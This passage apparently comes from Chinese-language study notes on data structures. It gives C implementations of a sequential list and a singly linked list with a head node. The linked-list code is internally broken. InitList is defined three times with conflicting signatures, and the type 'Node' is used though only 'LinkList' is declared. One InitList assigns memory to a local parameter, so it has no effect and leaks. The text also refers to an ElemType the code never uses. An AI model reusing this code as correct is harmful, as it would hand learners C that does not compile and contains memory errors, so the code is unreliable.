class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>-&gt;size == <span class="hljs-built_in">list</span>-&gt;capacity) &#123;<br>        expandCapacity(<span class="hljs-built_in">list</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-built_in">list</span>-&gt;size; i &gt; position; i--) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i] = <span class="hljs-built_in">list</span>-&gt;data[i - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;data[position] = value;<br>    <span class="hljs-built_in">list</span>-&gt;size++;<br>&#125;<br><span class="hljs-comment">// 删除顺序表中的元素</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteElement</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> position)</span> &#123;<br>    <span class="hljs-keyword">if</span> (position &lt; <span class="hljs-number">0</span> || position &gt;= <span class="hljs-built_in">list</span>-&gt;size) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除位置不合法！\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = position; i &lt; <span class="hljs-built_in">list</span>-&gt;size - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i] = <span class="hljs-built_in">list</span>-&gt;data[i + <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;size--;<br>&#125;<br><span class="hljs-comment">// 查找元素在顺序表中的位置</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">findElement</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>-&gt;size; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>-&gt;data[i] == value) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 未找到返回-1</span><br>&#125;<br><span class="hljs-comment">// 打印顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printSeqList</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;顺序表：&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>-&gt;size; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, <span class="hljs-built_in">list</span>-&gt;data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 释放顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">destroySeqList</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-built_in">free</span>(<span class="hljs-built_in">list</span>-&gt;data);<br>    <span class="hljs-built_in">free</span>(<span class="hljs-built_in">list</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 初始化顺序表</span><br>    SeqList *<span class="hljs-built_in">list</span> = initSeqList(<span class="hljs-number">5</span>);<br>    <span class="hljs-comment">// 插入元素</span><br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">1</span>, <span class="hljs-number">20</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>, <span class="hljs-number">30</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">4</span>, <span class="hljs-number">50</span>);<br>    printSeqList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// 删除元素</span><br>    deleteElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>);<br>    printSeqList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// 查找元素</span><br>    <span class="hljs-type">int</span> pos = findElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">40</span>);<br>    <span class="hljs-keyword">if</span> (pos != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;元素40的位置是：%d\n&quot;</span>, pos);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到元素40\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 释放顺序表</span><br>    destroySeqList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>​       单链表是一种链式存储的线性表结构。</p><p>结构定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 数据域，存储节点的数据</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span>  <span class="hljs-comment">// 指针域，指向下一个节点</span><br>&#125; LinkList;<br><br></code></pre></td></tr></table></figure><p>其中：</p><ul><li><code>ElemType</code> 是节点的数据类型，可以是任何合法的数据类型。</li><li><code>data</code> 域用于存储节点的实际数据。</li><li><code>next</code> 域是指向下一个节点的指针。<br>通过这种方式，每个节点都只保存了它后面一个节点的地址，从而形成了一个单向的链接关系。</li></ul><p>注意区分：带头节点的链表和不带头节点的链表的区别</p><ul><li><strong>带头节点的链表</strong>：有一个专门的头节点，这个头节点不存储有效数据，只是作为链表的起始位置，用来简化对链表的插入、删除等操作。</li><li><strong>不带头节点的链表</strong>：链表的第一个节点就是存储有效数据的节点。</li></ul><p>L-&gt;|     | -&gt;|   1  | -&gt; |   2   |   </p><p>L-&gt;|   1  | -&gt; |   2   |</p><p>版本一：</p><p>带头节点的链表实现</p><ol><li>使用一个额外的头节点，头节点不存储有效数据。</li><li>头节点的作用是方便对链表的操作，例如在插入、删除时，不需要判断链表是否为空。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 数据域，存储节点的数据</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span>  <span class="hljs-comment">// 指针域，指向下一个节点</span><br>&#125; LinkList;<br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(LinkList *head)</span> &#123;<br>    <span class="hljs-comment">/* 初始化带头结点的链表头指针 */</span><br>    head = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList));  <span class="hljs-comment">// 创建头结点</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;                            <span class="hljs-comment">// 头结点的 next 指向 NULL，表示空链表</span><br>&#125;<br><span class="hljs-comment">/* 用头插法建立带头结点的单链表 */</span><br>LinkList *<span class="hljs-title function_">AddHead</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head, *p;<br>    <span class="hljs-type">int</span> x;<br>    head = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList));  <span class="hljs-comment">// 创建头结点</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;            <span class="hljs-comment">// 初始化一个空链表，L为头指针</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入节点数据（输入-1结束）：&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                   <span class="hljs-comment">// 输入数据</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;            <span class="hljs-comment">// 循环条件：输入值不为 -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// 生成新节点</span><br>        p-&gt;data = x;                   <span class="hljs-comment">// 赋值给新节点</span><br>        p-&gt;next = head-&gt;next;         <span class="hljs-comment">// 将新节点插入到头结点之后</span><br>        head-&gt;next = p;                 <span class="hljs-comment">// 更新头结点的 next 指针</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);            <span class="hljs-comment">// 继续输入下一个数据</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                     <span class="hljs-comment">// 返回头指针</span><br>&#125;<br><span class="hljs-comment">/* 尾插法建立带头结点的单链表 */</span><br>LinkList *<span class="hljs-title function_">AddTail</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head, *p, *q;<br>    <span class="hljs-type">int</span> x;<br>    head = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList));  <span class="hljs-comment">// 创建头结点</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;               <span class="hljs-comment">// 初始化一个空链表，L为头指针</span><br>    q = head;                        <span class="hljs-comment">// 尾指针初始化为头结点</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入节点数据（输入-1结束）：&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                              <span class="hljs-comment">// 输入数据</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;                <span class="hljs-comment">// 循环条件：输入值不为 -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// 生成新节点</span><br>        p-&gt;data = x;                <span class="hljs-comment">// 赋值给新节点</span><br>        <span class="hljs-keyword">if</span>(head-&gt;next == <span class="hljs-literal">NULL</span> )&#123;<br>            head-&gt;next = p;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            q-&gt;next = p;<br>        &#125;<br>        q = p;                                  <span class="hljs-comment">// 更新尾指针</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                    <span class="hljs-comment">// 继续输入下一个数据</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(q!=<span class="hljs-literal">NULL</span>)&#123;<br>        q-&gt;next = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                                  <span class="hljs-comment">// 返回头指针</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(LinkList *head)</span> &#123;<br>    head = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建头结点</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 头结点的next初始化为空</span><br>&#125;<br><br><br><span class="hljs-comment">// 初始化带头节点的链表</span><br>Node* <span class="hljs-title function_">InitList</span><span class="hljs-params">()</span> &#123;<br>    Node *head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// 创建头节点</span><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    head-&gt;next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 初始化为空链表</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><br><span class="hljs-comment">// 在链表末尾插入新节点</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p = p-&gt;next; <span class="hljs-comment">// 找到链表的末尾</span><br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// 将新节点插入到链表末尾</span><br>&#125;<br><br><span class="hljs-comment">// 在指定节点之前插入新节点（前插法）</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != target) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next == target) &#123;<br>        newNode-&gt;next = target;<br>        p-&gt;next = newNode;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到目标节点\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(newNode);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 在指定节点之后插入新节点（后插法）</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = target-&gt;next;<br>    target-&gt;next = newNode;<br>&#125;<br><br><span class="hljs-comment">// 打印链表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node *head)</span> &#123;<br>    Node *p = head-&gt;next; <span class="hljs-comment">// 从头节点后的第一个有效节点开始</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 按值删除节点</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next-&gt;data != value) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// 找到要删除的节点</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// 重新连接链表</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// 释放节点内存</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 按序号删除节点</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无效的索引\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// 找到要删除的节点</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// 重新连接链表</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// 释放节点内存</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;索引超出范围\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 按值查找节点</span><br>Node* <span class="hljs-title function_">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *p = head-&gt;next; <span class="hljs-comment">// 从第一个有效节点开始</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到匹配的节点</span><br>&#125;<br><br><span class="hljs-comment">// 按序号查找节点</span><br>Node* <span class="hljs-title function_">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head-&gt;next;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p; <span class="hljs-comment">// 如果索引超出范围，将返回 NULL</span><br>&#125;<br><br><span class="hljs-comment">// 求链表长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetLength</span><span class="hljs-params">(Node *head)</span> &#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head-&gt;next;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    Node *head = InitList(); <span class="hljs-comment">// 初始化带头节点的链表</span><br><br>    <span class="hljs-comment">// 插入一些节点</span><br>    Insert(head, <span class="hljs-number">10</span>);<br>    Insert(head, <span class="hljs-number">20</span>);<br>    Insert(head, <span class="hljs-number">30</span>);<br>    Insert(head, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// 打印链表内容</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表内容为：&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// 在值为30的节点之前插入值为25的节点</span><br>    InsertBefore(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为30的节点之前插入值为25的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// 在值为25的节点之后插入值为27的节点</span><br>    InsertAfter(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为25的节点之后插入值为27的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// 删除值为20的节点</span><br>    Delete(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除值为20的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// 按序号删除节点</span><br>    DeleteAt(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除索引为2的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// 按值查找节点</span><br>    Node *foundNode = FindByValue(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到值为30的节点，地址为：%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到值为30的节点\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 按序号查找节点</span><br>    foundNode = FindByIndex(head, 